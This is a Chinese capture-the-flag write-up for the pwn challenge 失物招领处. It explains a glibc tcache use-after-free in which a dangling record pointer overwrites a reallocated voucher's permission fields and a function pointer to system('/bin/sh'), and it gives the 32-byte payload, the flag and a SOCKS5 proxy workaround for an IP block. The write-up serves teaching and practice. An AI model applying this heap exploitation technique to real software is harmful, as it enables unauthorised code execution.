# 失物招领处 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Pwn / glibc 堆 UAF（tcache 复用，覆写凭证结构拿 shell） |
| 分值 | 864（动态分值） |
| 类型 | DynamicContainer |
| 入口 | `103.163.47.230:34424`（赛后已释放） |
| Flag | `HTUCTF{94805287-ad80-4177-aa95-e524b1cda6ff}` |
| 提交记录 | 1 次，submitId 4756，Accepted |
| 复现脚本 | `exp.py`（一键）、`tunnel.py`（代理 CONNECT 隧道）、`xdis.py`（capstone 反汇编小工具） |

## 0. 环境说明

本机出口 IP 被平台在 `103.163.47.230` 上 REJECT（所有端口 RST），所以靶机连接走
「HTTP 代理 CONNECT 隧道」或 SOCKS5：`tunnel.py` 负责前者，`_socks_ok.txt` 里是可用的 SOCKS5 列表。
`exp.py` 用 `socks` + `pwn.remote.fromsocket(sock)`，交互层还是 pwntools。

## 1. 保护与结构

```
Arch:     amd64
PIE:      No PIE (0x400000)
Canary:   found
NX:       enabled
RELRO:    Full RELRO          → 不能打 GOT
libc:     2.43 (Debian)
```

程序（`uaf`）是个菜单：

```
1. 登记一件失物      -> malloc(0x20)，最多拷 16 字节描述
2. 删除失物档案      -> free(record)，然后置 deleted=1
3. 编辑失物档案      -> 用【悬空指针】memcpy 32 字节（输入 64 个 hex 字符）
4. 申请领取凭证      -> malloc(0x20)，初始化凭证结构
5. 使用领取凭证      -> 校验通过后 call [voucher+0x18]
```

开场白已经把漏洞写脸上了：

> 管理员提醒：失物档案删除后，旧登记索引偶尔还会留在系统里。
> 领取凭证与失物档案使用相同规格的存储格。

## 2. 两个结构（都是 0x20 字节）

发放凭证时写入的初始值（反汇编 `0x4016cd` 起）：

```
+0x10  dword = 1
+0x14  dword = 0
+0x18  qword = 0x401246        ; 该函数体就是 system("/bin/sh")
```

`use_collection_permit`（`0x4017b4`）的校验：

```
if (voucher == NULL)              -> "你还没有领取凭证"
if (*(u32*)(voucher+0x10) != 0x1337C0DE) -> "凭证权限不足或尚未激活"
if (*(u32*)(voucher+0x14) != 1)          -> 同上
call *(void**)(voucher+0x18)             -> 拿 shell
```

题面还贴心地把编号写出来了：「高级权限编号是 0x1337C0DE」。

注意：**发放时写的是 `+0x10=1`，校验时却要求等于 `0x1337C0DE`**，所以正常玩法永远过不去，必须自己改。

## 3. 利用链

```
1. 登记   -> malloc(0x20) → chunk A，record_ptr = A
2. 删除   -> free(A)，record_ptr 仍指向 A（悬空）
3. 申请凭证 -> malloc(0x20) 从 tcache 里拿回同一块 A，voucher_ptr == record_ptr
4. 编辑   -> memcpy(record_ptr, 32 字节)  ← 借着悬空索引直接覆写凭证
5. 使用凭证 -> 校验通过 → system("/bin/sh")
```

第 4 步的 32 字节布局：

```python
payload = b'A'*16 + p32(0x1337C0DE) + p32(1) + p64(0x401246)
#                    ^+0x10 权限      ^+0x14 激活  ^+0x18 函数指针
```

前 16 字节随便是因为校验根本不看；`0x401246` 保留原值即可（非 PIE，地址固定）。

## 4. 关键交互与坑

- 编辑要输入 **64 个十六进制字符**（`read_hex_payload` 会校验 strlen==0x40 且逐字符 0-9a-f），否则直接返回失败。
- 一开始用公共 HTTP 代理做 CONNECT 隧道时，登记完描述连接就被 RST（代理问题，不是程序崩）。
  换 SOCKS5 之后一路畅通，所以最终方案是 SOCKS5。
- 拿到 shell 后 `cat /flag*` 直接出：

```
HTUCTF{94805287-ad80-4177-aa95-e524b1cda6ff}
```

## 5. 一句话总结

free 之后不清指针 → 凭证 malloc 复用同一块 → 用「编辑旧记录」覆写凭证的
`permission`/`activated`/函数指针，把函数指针保持成 `0x401246`（`system("/bin/sh")`）即可。
